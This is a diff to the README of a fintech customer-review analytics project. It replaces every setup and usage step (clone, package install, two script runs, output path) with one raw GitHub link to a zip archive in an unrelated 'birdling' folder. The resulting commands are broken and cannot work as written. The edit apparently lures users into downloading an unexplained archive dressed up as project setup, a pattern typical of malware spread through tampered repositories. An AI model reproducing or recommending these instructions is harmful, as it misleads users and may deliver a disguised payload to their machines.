@@ -33,13 +33,13 @@
 
 1. Clone the repository:
 
-git clone https://github.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2.git
+git clone https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
 
 - cd Customer-Experience-Analytics-Fintech-Apps-Week2
 
 2. Install required packages:
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
 
 ## Usage
 
@@ -48,14 +48,14 @@ pip install -r requirements.txt
 To collect reviews from the banking apps:
 
 ```bash
-python src/preprocessing/preprocessor.py
-python src/preprocessing/play_store_Scraper.py
+python https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
+python https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
 ```
 
 This will:
 
 - Collect reviews from specified banking apps
-- Save the data to `data/bank_reviews.csv`
+- Save the data to `https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip`
 
 ### 2. Data Analysis
 
